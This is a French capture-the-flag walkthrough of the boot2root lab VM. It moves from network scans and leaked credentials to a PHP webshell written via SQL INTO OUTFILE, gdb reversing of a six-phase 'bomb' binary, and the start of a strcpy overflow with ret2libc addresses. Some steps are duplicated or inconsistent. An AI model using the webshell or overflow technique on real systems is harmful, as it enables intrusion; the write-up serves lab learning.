# Recherche de l'IP de l'ISO boot2root
On va utiliser **nmap**, qui va nous permet de scanner (dans un premier temps), les IP utilisées par VirtualBox :
<pre><code>> nmap -sP IP-Vbox/24

Nmap scan report for IP (IP)
Host is up (0.0080s latency).
Nmap scan report for IP (IP)
Host is up (0.011s latency).
Nmap scan report for IP (IP)
Host is up (0.0031s latency).
Nmap scan report for IP (IP)
Host is up (0.0040s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 3.19 seconds
</code></pre>

On teste les IP une à une pour savoir laquelle nous donne quelque chose d'intérressant :
<pre><code>> nmap IP

Nmap scan report for IP (IP)
Host is up (0.0055s latency).
Not shown: 987 filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
110/tcp open  pop3
119/tcp open  nntp
143/tcp open  imap
443/tcp open  https
465/tcp open  smtps
563/tcp open  snews
587/tcp open  submission
993/tcp open  imaps
995/tcp open  pop3s

Nmap done: 1 IP address (1 host up) scanned in 4.71 seconds
</code></pre>

Après avoir réussi à trouver l'IP, nous allons chercher l'architecture du site **HTTPS** grâce à **dirb** (*Attaque Brute Force dictionnaire*):
<pre><code>> dirb https://IP

GENERATED WORDS: 4612

---- Scanning URL: https://IP/ ----
+ https://IP/cgi-bin/ (CODE:403|SIZE:289)
==> DIRECTORY: https://IP/forum/
==> DIRECTORY: https://IP/phpmyadmin/
+ https://IP/server-status (CODE:403|SIZE:294)
==> DIRECTORY: https://IP/webmail/

</code></pre>

## Partie HTTPS

On se dirige vers **/forum** où l'on  trouve un topic :

 <code>Probleme login ?</code>


On voit que le topic est créé par **lmezard**, et que la page est rempli de log créé par un admin,
on cherche donc le nom **lmezard** dans la page, et on tombe sur ceci:
<pre><code>Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)</code></pre>
>On observe que **lmezard** a tapé son mdp a la place de sopn login: **!q\]Ej?*5K5cy*AJ**

Par la suite, on se connecte au profil de lmezard sur le forum.

<code>Username : lmezard

Password : !q\]Ej?*5K5cy*AJ</code>

On peut trouver sur son profil, son adresse mail :

<pre>laurie@borntosec.net
</pre>

On tente de se connecter sur https://IP/webmail avec le même password et on découvre 2 mails, celui qui nous intéresse est **DB ACCESS**, dans lequel on trouve le login et le mdp pour phpmyadmin

<code>root/Fg-'kKXBj87E:aJ$
</code>

On se connecte phpmyadmin en tant que root. On a donc acces aux requestes sur la base de données, ce qui nous permet d'effectuer un **exploit** qui consite a créer un **Webshell** grâce a la query SQL.

```sql
SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {system($_GET[\'cmd\']);} ?> </pre></BODY></HTML>"
INTO OUTFILE '/var/www/forum/templates_c/phpshell.php'
```

On se dirige vers https://IP/forum/templates_c/phpshell.php (là ou est créer le **webshell**) et on tente de trouver des fichiers ou données a exploiter.
On commence par lister tous les fichiers auquel l'user à accès :

<pre><code>> find / -user www-data -print 2>/dev/null
/home
/home/LOOKATME
/home/LOOKATME/password
...
</code></pre>

On **cat** le fichier :
<pre><code>> cat /home/LOOKATME/password
lmezard:G!@M6f4Eatau{sF"
</code></pre>

On a donc un user et son password, mais il ne fonctionne pas en ssh.
Cependant grâce au **nmap** effectuer au debut, on sait que le port **FTP** est ouvert (<code>21/tcp  open  ftp</code>), donc on utilise un logiciel tier (**Filezilla) pour se connecter avec 
<pre><code>lmezard
G!@M6f4Eatau{sF"</code></pre>

Ceci nous donnes accès à deux fichiers:
<pre><code>fun
README
</code></pre>

>README :
><pre><code>Complete this little challenge and use the result as password for user 'laurie' to login in ssh</code></pre>

On cherche à savoir le type de fichier de fun :
<pre><code>> file fun
fun: POSIX tar archive (GNU)
</code></pre>

On le decompresse :
<pre><code>tar -xvf fun</code></pre>

En lisant quelques fichiers, que chaque fichier contient un ligne de code en C et on se rend compte qu'il possedent un ordre :
<pre>//file***</pre>

On créer donc un script en **python** qui va nous permettre de créer un fichier **main.c** qui contient la totalité de tous les fichiers mais mis dans l'ordre.
```python
import os
import re

main = {}

for file in os.listdir("ft_fun"):
	with open(f"ft_fun/{file}", "r") as f:
		code = f.read()
		# print(code)
		result = re.findall(r'//file([0-9]*)', code)
		main[int(result[0])] = code

with open("main.c", "w+") as f:
	for value in sorted(main.items()):
		f.write(str(value[1]) + "\n")
```
On compile et teste :
<pre><code>> gcc main.c
> ./a.out
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit%</code></pre>

On applique un sha256:
<pre><code>> openssl sha256
> Iheartpwnage
(stdin)= 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4</code></pre>

On peut maintenant se connecter en **ssh** avec :
<pre>
laurie
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
</pre>

## Partie **./bomb**

On trouve dans le dossier **/home**, un **README** :
<pre><code>> cat README
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
</code></pre>

Et un binaire **./bomb**, qu'on lance:
<pre><code>> ./bomb
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
test

BOOM!!!
The bomb has blown up.
</code></pre>

On va devoir trouver l'input pour passer.
On utilise **GNU Debugger** pour regarder, ce à quoi ressemble le binaire :
```
> gdb ./bomb -q
Reading symbols from /home/laurie/bomb...done.
(gdb)> disas main
Dump of assembler code for function main:
...
   0x08048a5b <+171>:   call   0x8048b20 <phase_1>
   0x08048a60 <+176>:   call   0x804952c <phase_defused>
...
   0x08048a7e <+206>:   call   0x8048b48 <phase_2>
   0x08048a83 <+211>:   call   0x804952c <phase_defused>
...
   0x08048aa1 <+241>:   call   0x8048b98 <phase_3>
   0x08048aa6 <+246>:   call   0x804952c <phase_defused>
...
   0x08048ac4 <+276>:   call   0x8048ce0 <phase_4>
   0x08048ac9 <+281>:   call   0x804952c <phase_defused>
...
   0x08048ae7 <+311>:   call   0x8048d2c <phase_5>
   0x08048aec <+316>:   call   0x804952c <phase_defused>
...
   0x08048b0a <+346>:   call   0x8048d98 <phase_6>
   0x08048b0f <+351>:   call   0x804952c <phase_defused>
...
```
> On observe qu'il y aura 6 phases a passer avant de pouvoir defuser la bombe

## Phase_1

```
(gdb)> disas phase_1
Dump of assembler code for function phase_1:
   0x08048b20 <+0>:     push   %ebp
   0x08048b21 <+1>:     mov    %esp,%ebp
   0x08048b23 <+3>:     sub    $0x8,%esp
   0x08048b26 <+6>:     mov    0x8(%ebp),%eax
   0x08048b29 <+9>:     add    $0xfffffff8,%esp
   0x08048b2c <+12>:    push   $0x80497c0
   0x08048b31 <+17>:    push   %eax
   0x08048b32 <+18>:    call   0x8049030 <strings_not_equal>
   0x08048b37 <+23>:    add    $0x10,%esp
   0x08048b3a <+26>:    test   %eax,%eax
   0x08048b3c <+28>:    je     0x8048b43 <phase_1+35>
   0x08048b3e <+30>:    call   0x80494fc <explode_bomb>
   0x08048b43 <+35>:    mov    %ebp,%esp
   0x08048b45 <+37>:    pop    %ebp
   0x08048b46 <+38>:    ret
End of assembler dump.
(gdb)> x/s 0x80497c0
0x80497c0:       "Public speaking is very easy."
```
> On utilise **x/s** pour lire la valeur **0x80497c0**

Le resultat pour de la **phase_1** est donc :
<pre><code>Public speaking is very easy.</code></pre>

## Phase_2
```
(gdb)> disas phase_2
Dump of assembler code for function phase_2:
   0x08048b48 <+0>:     push   %ebp
   0x08048b49 <+1>:     mov    %esp,%ebp
   0x08048b4b <+3>:     sub    $0x20,%esp
   0x08048b4e <+6>:     push   %esi
   0x08048b4f <+7>:     push   %ebx
   0x08048b50 <+8>:     mov    0x8(%ebp),%edx
   0x08048b53 <+11>:    add    $0xfffffff8,%esp
   0x08048b56 <+14>:    lea    -0x18(%ebp),%eax
   0x08048b59 <+17>:    push   %eax
   0x08048b5a <+18>:    push   %edx
   0x08048b5b <+19>:    call   0x8048fd8 <read_six_numbers>
   0x08048b60 <+24>:    add    $0x10,%esp
   0x08048b63 <+27>:    cmpl   $0x1,-0x18(%ebp)
   0x08048b67 <+31>:    je     0x8048b6e <phase_2+38>
   0x08048b69 <+33>:    call   0x80494fc <explode_bomb>
   0x08048b6e <+38>:    mov    $0x1,%ebx
   0x08048b73 <+43>:    lea    -0x18(%ebp),%esi
   0x08048b76 <+46>:    lea    0x1(%ebx),%eax
   0x08048b79 <+49>:    imul   -0x4(%esi,%ebx,4),%eax
   0x08048b7e <+54>:    cmp    %eax,(%esi,%ebx,4)
   0x08048b81 <+57>:    je     0x8048b88 <phase_2+64>
   0x08048b83 <+59>:    call   0x80494fc <explode_bomb>
   0x08048b88 <+64>:    inc    %ebx
   0x08048b89 <+65>:    cmp    $0x5,%ebx
   0x08048b8c <+68>:    jle    0x8048b76 <phase_2+46>
   0x08048b8e <+70>:    lea    -0x28(%ebp),%esp
   0x08048b91 <+73>:    pop    %ebx
   0x08048b92 <+74>:    pop    %esi
   0x08048b93 <+75>:    mov    %ebp,%esp
   0x08048b95 <+77>:    pop    %ebp
   0x08048b96 <+78>:    ret
End of assembler dump.
```
On observe la presence d'une boucle :
```
   0x08048b76 <+46>:    lea    0x1(%ebx),%eax
   0x08048b79 <+49>:    imul   -0x4(%esi,%ebx,4),%eax
   0x08048b7e <+54>:    cmp    %eax,(%esi,%ebx,4)
   0x08048b81 <+57>:    je     0x8048b88 <phase_2+64>
   0x08048b83 <+59>:    call   0x80494fc <explode_bomb>
   0x08048b88 <+64>:    inc    %ebx
   0x08048b89 <+65>:    cmp    $0x5,%ebx
   0x08048b8c <+68>:    jle    0x8048b76 <phase_2+46>
```
Ainsi que ces deux lignes :
```
   0x08048b7e <+54>:    cmp    %eax,(%esi,%ebx,4)
   0x08048b81 <+57>:    je     0x8048b88 <phase_2+64
```

On comprend donc que si la comparaison **%eax (%esi,%ebx,4)** ne fonctionne pas on appelle la fonction <code>explode_bomb</code>

On fait donc un **breakpoint** sur la ligne 54, afin de voir à quelle valeur **%eax** est comparé.

On sait que l'on a besoin d'effectuer cette action 6 fois car 6 nombres sont requis :
```
0x08048b5b <+19>:    call   0x8048fd8 <read_six_numbers>
```


Le resultat pour de la **phase_2** est donc :
<pre><code>1 2 6 24 120 720</code></pre>

## Phase_3
```
(gdb)> disas phase_3
Dump of assembler code for function phase_3:
...
0x08048bb7 <+31>:    call   0x8048860 <sscanf@plt>	# ("%d %c %d")
0x08048bbc <+36>:    add    $0x20,%esp
0x08048bbf <+39>:    cmp    $0x2,%eax				# Compare le nombre d'arg de sscanf si moins de 3 explode
0x08048bc2 <+42>:    jg     0x8048bc9 <phase_3+49>
0x08048bc4 <+44>:    call   0x80494fc <explode_bomb>
0x08048bc9 <+49>:    cmpl   $0x7,-0xc(%ebp)			# Compare la valeur du premier arg a 7 (< 7)
0x08048bcd <+53>:    ja     0x8048c88 <phase_3+240>
0x08048bd3 <+59>:    mov    -0xc(%ebp),%eax
0x08048bd6 <+62>:    jmp    *0x80497e8(,%eax,4)		# Jump a l'adresse 0x80497e8 + 4 * valeur du premier arg
0x08048bdd <+69>:    lea    0x0(%esi),%esi
0x08048be0 <+72>:    mov    $0x71,%bl
0x08048be2 <+74>:    cmpl   $0x309,-0x4(%ebp)
0x08048be9 <+81>:    je     0x8048c8f <phase_3+247>
0x08048bef <+87>:    call   0x80494fc <explode_bomb>
0x08048bf4 <+92>:    jmp    0x8048c8f <phase_3+247> 
0x08048bf9 <+97>:    lea    0x0(%esi,%eiz,1),%esi
0x08048c00 <+104>:   mov    $0x62,%bl				# Load 214 dans bl, code ASCII de b
0x08048c02 <+106>:   cmpl   $0xd6,-0x4(%ebp)		# Jump a 247 et fini
...
0x08048c86 <+238>:    jmp    0x8048c8f <phase_3+247>
0x08048c88 <+240>:    mov    $0x78,%bl
0x08048c8a <+242>:    call   0x80494fc <explode_bomb>
0x08048c8f <+247>:    cmp    -0x5(%ebp),%bl
0x08048c92 <+250>:    je     0x8048c99 <phase_3+257>
0x08048c94 <+252>:    call   0x80494fc <explode_bomb>
0x08048c99 <+257>:    mov    -0x18(%ebp),%ebx
0x08048c9c <+260>:    mov    %ebp,%esp
0x08048c9e <+262>:    pop    %ebp
0x08048c9f <+263>:    ret
```
On sait que le resultat attendu sera :
```
0x08048bb7 <+31>:    call   0x8048860 <sscanf@plt>	# ("%d %c %d")
```

On sait aussi grâce a l'indice de README que le **%c** est 'b'.
On cherche donc les deux nombres manquants.

On sait que le premier nombre doit être inférieur a 7:
<pre><code>0x08048bc9 <+49>:    cmpl   $0x7,-0xc(%ebp)</code></pre>

De plus la ligne ci-dessous effectue un **jump** à l'adresse stocké à l'adresse 
**0x80497e8 + la valeur de notre premier argument * 4** :
<pre><code>0x08048bd6 <+62>:    jmp    *0x80497e8(,%eax,4)</code></pre>

Si on affiche la range de notre adresse avec les 30 suivantes :
```
(gdb)> x/30x 0x80497e8
0x80497e8:      0x08048be0      0x08048c00      0x08048c16      0x08048c28
0x80497f8:      0x08048c40      0x08048c52      0x08048c64      >0x08048c76
```
> On peut voir que **0x08048c00** correspond a un jump cohérent vers la ligne 104 de **phase_3**, donc 1 adresse plus loin.

De plus, a cette valeur ce trouve :
<pre><code>0x08048c00 <+104>:   mov    $0x62,%bl</code></pre>
> Qui load la lettre b dans %bl

Par la suite on observe :
<pre><code>0x08048c8f <+247>:    cmp    -0x5(%ebp),%bl</code></pre>

Et pour finir on observe:
<pre><code>0x08048c02 <+106>:   cmpl   $0xd6,-0x4(%ebp)</code></pre>
> Qui compare la valeur 214 avec notre troisième argument.

Le resultat pour de la **phase_3** est donc :
<pre><code>1 b 214</code></pre>

## Phase_4
```
(gdb) disas phase_4
Dump of assembler code for function phase_4:
   0x08048ce0 <+0>:     push   %ebp
   0x08048ce1 <+1>:     mov    %esp,%ebp
   0x08048ce3 <+3>:     sub    $0x18,%esp
   0x08048ce6 <+6>:     mov    0x8(%ebp),%edx
   0x08048ce9 <+9>:     add    $0xfffffffc,%esp
   0x08048cec <+12>:    lea    -0x4(%ebp),%eax
   0x08048cef <+15>:    push   %eax
   0x08048cf0 <+16>:    push   $0x8049808				# "%d
   0x08048cf5 <+21>:    push   %edx
   0x08048cf6 <+22>:    call   0x8048860 <sscanf@plt>
   0x08048cfb <+27>:    add    $0x10,%esp
   0x08048cfe <+30>:    cmp    $0x1,%eax
   0x08048d01 <+33>:    jne    0x8048d09 <phase_4+41>
   0x08048d03 <+35>:    cmpl   $0x0,-0x4(%ebp)
   0x08048d07 <+39>:    jg     0x8048d0e <phase_4+46>
   0x08048d09 <+41>:    call   0x80494fc <explode_bomb>
   0x08048d0e <+46>:    add    $0xfffffff4,%esp
   0x08048d11 <+49>:    mov    -0x4(%ebp),%eax
   0x08048d14 <+52>:    push   %eax
   0x08048d15 <+53>:    call   0x8048ca0 <func4>
   0x08048d1a <+58>:    add    $0x10,%esp
   0x08048d1d <+61>:    cmp    $0x37,%eax
   0x08048d20 <+64>:    je     0x8048d27 <phase_4+71>
   0x08048d22 <+66>:    call   0x80494fc <explode_bomb>
   0x08048d27 <+71>:    mov    %ebp,%esp
   0x08048d29 <+73>:    pop    %ebp
   0x08048d2a <+74>:    ret
End of assembler dump.
```

On observe que la phase_4 prend un nombre en argument puis appelle une fonction **func4** :

```
(gdb)> disas func4
Dump of assembler code for function func4:
0x08048ca0 <+0>:    push   %ebp
0x08048ca1 <+1>:    mov    %esp,%ebp
0x08048ca3 <+3>:    sub    $0x10,%esp
0x08048ca6 <+6>:    push   %esi
0x08048ca7 <+7>:    push   %ebx
0x08048ca8 <+8>:    mov    0x8(%ebp),%ebx
0x08048cab <+11>:    cmp    $0x1,%ebx			<= Si ebx = 1 
0x08048cae <+14>:    jle    0x8048cd0 <func4+48>	|
0x08048cb0 <+16>:    add    $0xfffffff4,%esp		|
0x08048cb3 <+19>:    lea    -0x1(%ebx),%eax			|	ebx -1
0x08048cb6 <+22>:    push   %eax					|
0x08048cb7 <+23>:    call   0x8048ca0 <func4>		|	Récursion
0x08048cbc <+28>:    mov    %eax,%esi				|	eax => esi
0x08048cbe <+30>:    add    $0xfffffff4,%esp		|
0x08048cc1 <+33>:    lea    -0x2(%ebx),%eax			|	ebx -2
0x08048cc4 <+36>:    push   %eax					|
0x08048cc5 <+37>:    call   0x8048ca0 <func4>		|	Récursion
0x08048cca <+42>:    add    %esi,%eax				|	esi + eax
0x08048ccc <+44>:    jmp    0x8048cd5 <func4+53>|	|
0x08048cce <+46>:    mov    %esi,%esi			|	|
0x08048cd0 <+48>:    mov    $0x1,%eax	<-------|---|
0x08048cd5 <+53>:    lea    -0x18(%ebp),%esp <--|
0x08048cd8 <+56>:    pop    %ebx
0x08048cd9 <+57>:    pop    %esi
0x08048cda <+58>:    mov    %ebp,%esp
0x08048cdc <+60>:    pop    %ebp
0x08048cdd <+61>:    ret
```
Qui peut se traduire en **C** par:
```c
#include <stdio.h>
#include <stdlib.h>

int func4(int nb)
{
	static int tmp;

	if (nb <= 1)
		return(1);
	tmp = func4(nb-1);
	tmp = tmp + func4(nb-2);
	return (tmp);
}


int main(int ac, char **av)
{
	int nb;

	nb = atoi(av[1]);
	nb = func4(nb);
}
```

A la fin de **phase_4** on compare le return de **func4** avec 55:
<pre><code>   0x08048d1d <+61>:    cmp    $0x37,%eax</code></pre>
> Apres plusieurs essais avec le code en **C**, on trouve que 9 nous donnes 55.

Le resultat pour de la **phase_4** est donc :
<pre><code>9</code></pre>


## Phase_5
```gdb
(gdb)> disas phase_5
Dump of assembler code for function phase_5:
   0x08048d2c <+0>:     push   %ebp
   0x08048d2d <+1>:     mov    %esp,%ebp
   0x08048d2f <+3>:     sub    $0x10,%esp
   0x08048d32 <+6>:     push   %esi
   0x08048d33 <+7>:     push   %ebx
   0x08048d34 <+8>:     mov    0x8(%ebp),%ebx
   0x08048d37 <+11>:    add    $0xfffffff4,%esp
   0x08048d3a <+14>:    push   %ebx
   0x08048d3b <+15>:    call   0x8049018 <string_length>
   0x08048d40 <+20>:    add    $0x10,%esp
   0x08048d43 <+23>:    cmp    $0x6,%eax
   0x08048d46 <+26>:    je     0x8048d4d <phase_5+33>
   0x08048d48 <+28>:    call   0x80494fc <explode_bomb>
   0x08048d4d <+33>:    xor    %edx,%edx
   0x08048d4f <+35>:    lea    -0x8(%ebp),%ecx
   0x08048d52 <+38>:    mov    $0x804b220,%esi
   0x08048d57 <+43>:    mov    (%edx,%ebx,1),%al
   0x08048d5a <+46>:    and    $0xf,%al
   0x08048d5c <+48>:    movsbl %al,%eax
   0x08048d5f <+51>:    mov    (%eax,%esi,1),%al
   0x08048d62 <+54>:    mov    %al,(%edx,%ecx,1)
   0x08048d65 <+57>:    inc    %edx
   0x08048d66 <+58>:    cmp    $0x5,%edx
   0x08048d69 <+61>:    jle    0x8048d57 <phase_5+43>
   0x08048d6b <+63>:    movb   $0x0,-0x2(%ebp)
   0x08048d6f <+67>:    add    $0xfffffff8,%esp
   0x08048d72 <+70>:    push   $0x804980b
   0x08048d77 <+75>:    lea    -0x8(%ebp),%eax
   0x08048d7a <+78>:    push   %eax
   0x08048d7b <+79>:    call   0x8049030 <strings_not_equal>
   0x08048d80 <+84>:    add    $0x10,%esp
   0x08048d83 <+87>:    test   %eax,%eax
   0x08048d85 <+89>:    je     0x8048d8c <phase_5+96>
   0x08048d87 <+91>:    call   0x80494fc <explode_bomb>
   0x08048d8c <+96>:    lea    -0x18(%ebp),%esp
   0x08048d8f <+99>:    pop    %ebx
   0x08048d90 <+100>:   pop    %esi
   0x08048d91 <+101>:   mov    %ebp,%esp
   0x08048d93 <+103>:   pop    %ebp
   0x08048d94 <+104>:   ret
End of assembler dump.
```

La phase 5 prends comment arguments une string puis vérifie sa taille, elle doit faire exactement 6 charactères:
```
   0x08048d3b <+15>:    call   0x8049018 <string_length>
   0x08048d40 <+20>:    add    $0x10,%esp
   0x08048d43 <+23>:    cmp    $0x6,%eax
   0x08048d46 <+26>:    je     0x8048d4d <phase_5+33>
   0x08048d48 <+28>:    call   0x80494fc <explode_bomb>
```
La chaines de charactères est formater via cette boucle:
```
   0x08048d4d <+33>:    xor    %edx,%edx				# set edx à 0
   0x08048d4f <+35>:    lea    -0x8(%ebp),%ecx			# load la string dans ecx
   0x08048d52 <+38>:    mov    $0x804b220,%esi			# move "isrveawhobpnutfg" dans esi
   0x08048d57 <+43>:    mov    (%edx,%ebx,1),%al  <---  # move dans al (edx + ebx*1)
   0x08048d5a <+46>:    and    $0xf,%al				  | # add à "al" la valeur 0xf = 32
   0x08048d5c <+48>:    movsbl %al,%eax				  | # move qui extend de 8b a 32(int)
   0x08048d5f <+51>:    mov    (%eax,%esi,1),%al	  | # move dans al la valeur (eax + esi*1)
   0x08048d62 <+54>:    mov    %al,(%edx,%ecx,1)	  | # move dans (edx + ecx*1) la valeur de al
   0x08048d65 <+57>:    inc    %edx					  | # incrémente edx
   0x08048d66 <+58>:    cmp    $0x5,%edx			  | # if edx = 5
   0x08048d69 <+61>:    jle    0x8048d57 <phase_5+43>-  # jump
```
En testant l'aphabet on peux voir que :

<pre>abcdefghijklmnopqrstuvwxyz
srveawhobpnutfgisrveawhobp</pre>

la phase_5 compare la string formater avec la valeur stocker dans :
```
(gdb)> x/s 0x804980b
0x804980b:       "giants"
```

```
   0x08048d6b <+63>:    movb   $0x0,-0x2(%ebp)
   0x08048d6f <+67>:    add    $0xfffffff8,%esp
   0x08048d72 <+70>:    push   $0x804980b
   0x08048d77 <+75>:    lea    -0x8(%ebp),%eax
   0x08048d7a <+78>:    push   %eax
   0x08048d7b <+79>:    call   0x8049030 <strings_not_equal>
```

Le resultat pour de la **phase_5** est donc :
<pre><code>opekmq</code></pre>
> A noter que plusieurs résultats sont possibles ici.

## Phase_6
```
(gdb)> disas phase_6
Dump of assembler code for function phase_6:
...
0x08048db3 <+27>:    call   0x8048fd8 <read_six_numbers> # 6 nombres
0x08048dba <+34>:    add    $0x10,%esp
0x08048dbd <+37>:    lea    0x0(%esi),%esi
0x08048dc0 <+40>:    lea    -0x18(%ebp),%eax
0x08048dc3 <+43>:    mov    (%eax,%edi,4),%eax
0x08048dc6 <+46>:    dec    %eax
0x08048dc7 <+47>:    cmp    $0x5,%eax
0x08048dca <+50>:    jbe    0x8048dd1 <phase_6+57>        # if %eax <= 5
0x08048dcc <+52>:    call   0x80494fc <explode_bomb>
0x08048dd1 <+57>:    lea    0x1(%edi),%ebx                # %ebx = %edi + 1
0x08048dd4 <+60>:    cmp    $0x5,%ebx
0x08048dd7 <+63>:    jg     0x8048dfc <phase_6+100>       # if %edx > 5
0x08048dd9 <+65>:    lea    0x0(,%edi,4),%eax 
0x08048de0 <+72>:    mov    %eax,-0x38(%ebp)
0x08048de3 <+75>:    lea    -0x18(%ebp),%esi
0x08048de6 <+78>:    mov    -0x38(%ebp),%edx
0x08048de9 <+81>:    mov    (%edx,%esi,1),%eax
0x08048dec <+84>:    cmp    (%esi,%ebx,4),%eax
0x08048def <+87>:    jne    0x8048df6 <phase_6+94>        # if unique
0x08048df1 <+89>:    call   0x80494fc <explode_bomb>
0x08048df6 <+94>:    inc    %ebx                          # %ebx ++
0x08048df7 <+95>:    cmp    $0x5,%ebx
0x08048dfa <+98>:    jle    0x8048de6 <phase_6+78>        # if %ebx <= 5
0x08048dfc <+100>:    inc    %edi                         # edi++
0x08048dfd <+101>:    cmp    $0x5,%edi
0x08048e00 <+104>:    jle    0x8048dc0 <phase_6+40>        # %edi <= 5
...
End of assembler dump.
```

On regardant le code, on se rend compte qu'il faut 6 arguments et que tous les nombres - 1 doit compris entre 0 et 5, donc entre 1 et 6 et de maniere unique.

De plus avec le hint on sait que le premier nombre est 4.

On a donc 120 possibilités d'arrangements. Il fait donc un script qui va tous tester :

```python
import itertools
import os

t = ["1", "2", "3", "5", "6"]
c = list(itertools.permutations(t, 5))
unq = set(c)
for i in unq:
	content = "Public speaking is very easy.\n1 2 6 24 120 720\n1 b 214\n9\nopekmq\n4 {}\n".format(' '.join(i))
	with open("soluce.txt", "w+") as f:
		f.write(content)
	os.system('./bomb soluce.txt > result')
	with open('result') as f:
		if 'BOOM' not in f.read():
			print(content.replace("\n", "").replace(" ", ""))
```
<pre><code>> python test.py
> cat soluce
...
4 3 1 2 5 6
</code></pre>

Le resultat pour de la **phase_6** est donc :
<pre><code>4 2 6 3 1 5</code></pre>

On obtient donc, si on suit ce que le README dit:

<code>Publicspeakingisveryeasy.126241207201b2149opekmq426315</code>

Cependant le mot de passe de l'ISO est :

<code>Publicspeakingisveryeasy.126241207201b2149opekmq426135</code>
> Le sujet n'est pas a jour, il faut inverser le char **n-1** avec le char **n-2**

On obtient donc, si on suit ce que le README dit:

<code>Publicspeakingisveryeasy.126241207201b2149opekmq426315</code>

Cependant le mot de passe de l'ISO est :

<code>Publicspeakingisveryeasy.126241207201b2149opekmq426135</code>
> Le sujet n'est pas a jour, il faut inverser le char **n-1** avec le char **n-2**

# Partie Turtle

On trouve un fichier **turtle** qui contient des instructions telles que:

<pre><code>Avance 100 spaces
...
Tourne droite de 90 degrees
...
Tourne gauche de 1 degrees
...
Recule 200 spaces
...
</code></pre>

Apres quelques recherches, on trouve qu'il s'agit d'un langage se nommant **LOGO**. On transforme le code avec les vraies instructions :
<pre><code>forward(100)
...
right(90)
...
left(1)
...
Recule 200 spaces
...
</code></pre>

À l'aide d'un interpréteur en ligne : https://www.calormen.com/jslogo/
On lance le code ainsi transformé bloc par bloc qui donnent :
S L A S H
> Ou à l'aide de notre script **translate_turtle**.

Avec SLASH dans MD5 on trouve : <code>646da671ca01bb5d84dbb5fb2238dc8e</code>
qui est le mot de passe de zaz.

# Partie Exploit Me
En se connectant a zaz on trouve le binaire **./exploit_me**

```
> gdb -q ./exploit_me
(gdb)> disas main
Dump of assembler code for function main:
   0x080483f4 <+0>:	push   %ebp
   0x080483f5 <+1>:	mov    %esp,%ebp
   0x080483f7 <+3>:	and    $0xfffffff0,%esp
   0x080483fa <+6>:	sub    $0x90,%esp
   0x08048400 <+12>:	cmpl   $0x1,0x8(%ebp)
   0x08048404 <+16>:	jg     0x804840d <main+25>
   0x08048406 <+18>:	mov    $0x1,%eax
   0x0804840b <+23>:	jmp    0x8048436 <main+66>
   0x0804840d <+25>:	mov    0xc(%ebp),%eax
   0x08048410 <+28>:	add    $0x4,%eax
   0x08048413 <+31>:	mov    (%eax),%eax
   0x08048415 <+33>:	mov    %eax,0x4(%esp)
   0x08048419 <+37>:	lea    0x10(%esp),%eax
   0x0804841d <+41>:	mov    %eax,(%esp)
   0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
   0x08048425 <+49>:	lea    0x10(%esp),%eax
   0x08048429 <+53>:	mov    %eax,(%esp)
   0x0804842c <+56>:	call   0x8048310 <puts@plt>
   0x08048431 <+61>:	mov    $0x0,%eax
   0x08048436 <+66>:	leave
   0x08048437 <+67>:	ret
End of assembler dump.
```
<pre><code>0x08048400 <+12>:	cmpl   $0x1,0x8(%ebp)</code></pre>
>Le compare nous indique que le programme attend 1 seul argument.
```
0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
```
>strcpy copie et stocke notre premier argument dans la stack sans vérifier si la taille de l'argument correspond à celle du buffer de destination.

La fonction est donc exploitable par <code>buffer_overflow</code> pour corrompre les valeurs sauvegardées de **%ebp** et **%eip**
```
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Starting program: /home/zaz/exploit_me AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x08048425 in main ()
(gdb) i f
Stack level 0, frame at 0xbffff720:
 eip = 0x8048425 in main; saved eip 0xb7e454d3
 Arglist at 0xbffff718, args:
 Locals at 0xbffff718, Previous frame's sp is 0xbffff720
 Saved registers:
  ebp at 0xbffff718, eip at 0xbffff71c
(gdb) x/30x $esp
0xbffff680:     0xbffff690      0xbffff8f4      0x00000000      0x00000000
0xbffff690:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff6a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff6b0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff6c0:     0x41414141      0x00004141      0xbffff71c      0xb7fd0ff4
0xbffff6d0:     0x08048440      0x080496e8      0x00000002      0x080482dd
0xbffff6e0:     0xb7fd13e4      0x00080000      0x080496e8      0x08048461
0xbffff6f0:     0xffffffff      0xb7e5edc6
```
Hex value:
bffff71c - bffff690 = 8C
>bffff71c : eip saved | bffff690 : buffer beggining

Decimal value:
3221223196 - 3221223056 = 140
>Offset : 140 characters

De 141 à 144 caractères on écrit sur l'adresse sauvegardée de **%eip**

Pour l'exploiter on va effectuer un <code>ret_to_libc</code> : le but étant de récupérer l'adresse de la fonction **system** et **exit**
```
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
(gdb) find &system,+9999999,"/bin/sh"
0xb7f8cc58
```
> On a ici les adresses de **system**, **exit** et de la variable d'environnement **/bin/sh**

```
